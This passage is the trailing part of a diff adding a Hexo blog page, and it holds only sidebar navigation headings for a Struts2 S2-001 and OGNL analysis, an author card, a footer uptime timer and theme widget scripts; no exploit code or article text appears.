href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E8%B0%83%E7%94%A8%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">命令执行 调用链子分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%83%BD%E8%A7%A3%E6%9E%90OGNL%E7%9A%84API"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 能解析OGNL的API</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#struct2-001"><span class="nav-number">4.</span> <span class="nav-text">struct2-001</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ognl-%E8%A7%A3%E6%9E%90%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">ognl 解析分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.2.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">30k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:48</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
